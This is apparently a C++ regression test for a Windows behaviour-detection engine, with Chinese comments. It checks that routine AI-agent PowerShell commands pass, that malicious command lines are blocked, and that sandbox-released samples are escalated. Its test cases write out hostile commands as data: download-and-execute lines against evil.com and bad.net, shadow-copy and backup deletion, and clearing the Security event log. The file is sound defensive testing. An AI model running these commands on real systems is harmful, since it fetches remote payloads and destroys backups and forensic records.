// behavior_regress_test.cpp — Agent 误报治理专项回归（2026-09-22）
//                            + 反沙箱逃逸提权专项回归（2026-10-02）
//
// 目的：验证「方案一（命令形态判据降级）+ 方案三（保留远程硬拦）」改造后，
//       ① Agent 日常操作不再被判为高危（不触发自动终止）
//       ② 真恶意（远程载荷 / 勒索 / 反取证）仍被硬拦
//       ③ ★ 2026-10-02 新增：反沙箱逃逸的「放行后监控提权」——
//          沙箱判 clean/suspicious 的样本进灰名单（observe.h），真机再跑时
//          `observed=true`，其**已可疑**行为（level>=1）必须被升到 level 2（可终止）；
//          同时必须**不**把 level0 的正常行为升档（否则等于给所有普通程序加误报面）。
//
// ★ 与 Python 复刻脚本的区别：这里调的是**真实的 JudgeCommandLine / JudgeProcess**，
//   不存在「复刻逻辑与实现漂移」的风险 —— 是真正的事实来源。
//
// 判定阈值来自 behavior.cpp::FinalizeScoreLevel：
//     score >= 55 -> level 2（高危，自动处置）
//     score >= 30 -> level 1（旁证，只记录）
//
// 编译（见 tools/build_behavior_regress.sh）：
//   cl /std:c++17 /MT behavior_regress_test.cpp behavior.cpp common.cpp sfutils.cpp

#include "behavior.h"
#include <chrono>
#include <cstdio>
#include <string>

static int g_pass = 0, g_fail = 0;

struct Case {
    const char* desc;
    const char* cmd;
    const char* image;
    bool expect_block;   // true = 期望被拦（level>=2 或 hard）
};

static void Run(const Case& c) {
    sf::ProcVerdict v = sf::JudgeCommandLine(c.cmd, c.image);
    // 「会被拦」的实际判定：hard 或 score 过阈值 55
    const bool blocked = v.hard || v.score >= 55;
    const bool ok = (blocked == c.expect_block);
    if (ok) ++g_pass; else ++g_fail;

    printf("%-42s lv=%d score=%-3d hard=%-5s tag=%-14s %s\n",
           c.desc, v.level, v.score, v.hard ? "true" : "false",
           v.tag.empty() ? "-" : v.tag.c_str(), ok ? "OK" : "FAIL");
    if (!ok) {
        printf("     期望%s，实际%s   reason=%s\n",
               c.expect_block ? "拦截" : "放行",
               blocked ? "拦截" : "放行", v.reason.c_str());
    }
}

// ---------------------------------------------------------------------------
//  反沙箱逃逸提权专项（2026-10-02）
// ---------------------------------------------------------------------------
//  被测链路（三处，缺一不可）：
//    service.cpp:OnSandboxReport  → 沙箱判 clean/suspicious ⇒ sf::ObserveAdd(path, 600)
//    service.cpp:2231 / 2904      → 进程创建/外联事件 ⇒ sf::ObserveHit(path) ⇒ ent.observed
//    behavior.cpp:1206            → observed && level>=1 && level<2 ⇒ 升 level=2
//
//  本段只覆盖**第三处**（判定层提权规则）。前两处属接线，需端到端验证。
// ---------------------------------------------------------------------------
struct ObsCase {
    const char* desc;
    const char* cmd;
    const char* image;
    bool        observed;      // 是否处于放行后监控期
    int         expectLevel;   // 期望最终 level
    bool        expectBlock;   // 期望会被拦（level>=2）
    bool        expectObsTag;  // 期望 reason 带「放行后监控升级」标记
};

static void RunObs(const ObsCase& c) {
    sf::ProcEntity e;
    e.imagePath  = c.image;
    e.commandLine = c.cmd;
    e.observed   = c.observed;

    sf::ProcVerdict v = sf::JudgeProcess(e);
    const bool blocked = (v.level >= 2);
    const bool obsMarked = (v.reason.find("[放行后监控升级]") != std::string::npos);

    const bool ok = (v.level == c.expectLevel) &&
                    (blocked == c.expectBlock) &&
                    (obsMarked == c.expectObsTag);
    if (ok) ++g_pass; else ++g_fail;

    printf("%-40s obs=%-5s lv=%d score=%-3d 期望lv=%d  标记=%-5s %s\n",
           c.desc, c.observed ? "true" : "false", v.level, v.score, c.expectLevel,
           obsMarked ? "有" : "无", ok ? "OK" : "FAIL");
    if (!ok) {
        printf("     期望 lv=%d 拦截=%d 标记=%d；实际 lv=%d 拦截=%d 标记=%d\n",
               c.expectLevel, (int)c.expectBlock, (int)c.expectObsTag,
               v.level, (int)blocked, (int)obsMarked);
        printf("     reason=%s\n", v.reason.c_str());
    }
}

// 桌面路径：非可信厂商路径 ⇒ ProcReputable 为假 ⇒ 服务层不会被信誉门放过（与 E2E 一致）
static const char* kDesktopProbe =
    "C:\\Users\\tianl\\Desktop\\sf_boxprobe.exe";

int main() {
    printf("===============================================================\n");
    printf(" Agent 误报治理专项回归（真实 JudgeCommandLine）\n");
    printf("===============================================================\n\n");

    const Case cases[] = {
        // ---------- Agent 日常操作：期望放行 ----------
        { "Agent 编码命令 base64 打包",
          "powershell.exe -EncodedCommand RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAEMAOgA=",
          "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", false },

        { "Agent 非交互三件套",
          "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command Get-ChildItem",
          "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", false },

        { "Agent 读取工作区文件",
          "powershell.exe -NoProfile -Command \"Get-Content C:\\Users\\tianl\\WorkBuddy\\a.md\"",
          "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", false },

        { "Agent 批量写入文件",
          "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"Set-Content D:\\out.txt ok\"",
          "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", false },

        { "隐藏窗口跑构建",
          "cmd.exe /c npm run build",
          "C:\\Windows\\System32\\cmd.exe", false },

        { "Agent 遍历目录",
          "powershell.exe -NoProfile -Command \"Get-ChildItem D:\\SilverFoxGuard -Recurse\"",
          "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", false },

        // ---------- 真恶意：期望拦截 ----------
        { "IEX 下载执行（远程载荷）",
          "powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://evil.com/a.ps1')\"",
          "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", true },

        { "mshta 执行远程 URL",
          "mshta.exe https://evil.com/payload.hta",
          "C:\\Windows\\System32\\mshta.exe", true },

        { "PS 直连远程 URL",
          "powershell.exe -Command \"Invoke-Expression (Invoke-WebRequest https://bad.net/x).Content\"",
          "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", true },

        { "删除卷影副本（勒索）",
          "vssadmin delete shadows /all /quiet",
          "C:\\Windows\\System32\\vssadmin.exe", true },

        { "清空事件日志（反取证）",
          "wevtutil cl Security",
          "C:\\Windows\\System32\\wevtutil.exe", true },

        { "完整路径删卷影（勒索·真实形态）",
          "C:\\Windows\\System32\\vssadmin.exe delete shadows /all /quiet",
          "C:\\Windows\\System32\\vssadmin.exe", true },

        { "wbadmin 删除备份（勒索）",
          "wbadmin.exe delete catalog -quiet",
          "C:\\Windows\\System32\\wbadmin.exe", true },

        // ---------- 边界：单看命令形态不该判死 ----------
        { "仅编码命令（无外联）",
          "powershell.exe -enc ZgBvAG8A",
          "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", false },

        { "仅隐藏窗口（无其它信号）",
          "powershell.exe -WindowStyle Hidden -Command Get-Date",
          "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", false },
    };

    const int n = sizeof(cases) / sizeof(cases[0]);
    for (int i = 0; i < n; ++i) Run(cases[i]);

    // =======================================================================
    //  反沙箱逃逸提权专项（2026-10-02）
    // =======================================================================
    printf("\n===============================================================\n");
    printf(" 反沙箱逃逸：「放行后监控」提权专项（真实 JudgeProcess）\n");
    printf("===============================================================\n\n");

    // 一个稳定落在 level=1（score 30~54）的「已可疑」命令行。
    //   bcdedit 是硬规则表里的 level=1 / score=35 项（修改启动配置）。
    //   ★ 这里只是把 <bcdedit> 当**文本参数**传给我们自己的样本，
    //     不会有任何程序真的去执行 bcdedit —— 判定层匹配的是命令行长什么样。
    const ObsCase obs[] = {
        // ---- ① 对照组：未进灰名单（未受观察）→ 只应停在「旁证」档 ----
        { "[对照] 可疑命令行·未受观察",
          "\"C:\\Users\\tianl\\Desktop\\sf_boxprobe.exe\" bcdedit",
          kDesktopProbe, /*observed=*/false, /*lv=*/1, /*block=*/false, /*obsTag=*/false },

        // ---- ② 实验组：沙箱判 clean 放行 ⇒ 进灰名单 ⇒ 同一条命令必须升级拦截 ----
        { "[实验] 可疑命令行·受观察",
          "\"C:\\Users\\tianl\\Desktop\\sf_boxprobe.exe\" bcdedit",
          kDesktopProbe, /*observed=*/true,  /*lv=*/2, /*block=*/true,  /*obsTag=*/true },

        // ---- ③ 非回归铁律：level0 的正常行为**绝不**因受观察而升档 ----
        //      （否则「放行后监控」会变成"凡被沙箱放行的程序都随时可能被杀"）
        { "[非回归] 正常命令行·受观察",
          "\"C:\\Users\\tianl\\Desktop\\sf_boxprobe.exe\" --selftest",
          kDesktopProbe, /*observed=*/true,  /*lv=*/0, /*block=*/false, /*obsTag=*/false },

        // ---- ④ 已是 level2（硬规则一票）→ 不受影响，且不该被重复改写 ----
        { "[非回归] 硬规则·受观察",
          "\"C:\\Users\\tianl\\Desktop\\sf_boxprobe.exe\" vssadmin delete shadows /all /quiet",
          kDesktopProbe, /*observed=*/true,  /*lv=*/2, /*block=*/true,  /*obsTag=*/false },
    };

    const int nObs = sizeof(obs) / sizeof(obs[0]);
    for (int i = 0; i < nObs; ++i) RunObs(obs[i]);

    const int total = n + nObs;
    printf("\n---------------------------------------------------------------\n");
    printf("结果: %d 通过 / %d 失败  （共 %d 项；其中提权专项 %d 项）\n",
           g_pass, g_fail, total, nObs);
    if (g_fail == 0) {
        printf("\n验收通过：Agent 日常操作全部放行，真恶意全部硬拦，\n");
        printf("          且沙箱放行样本在真机复现可疑行为时被提权拦截。\n");
    } else {
        printf("\n验收未通过，请检查 behavior.cpp 的降级 / host-url 硬拦 / 放行后监控提权逻辑。\n");
    }
    return g_fail == 0 ? 0 : 1;
}
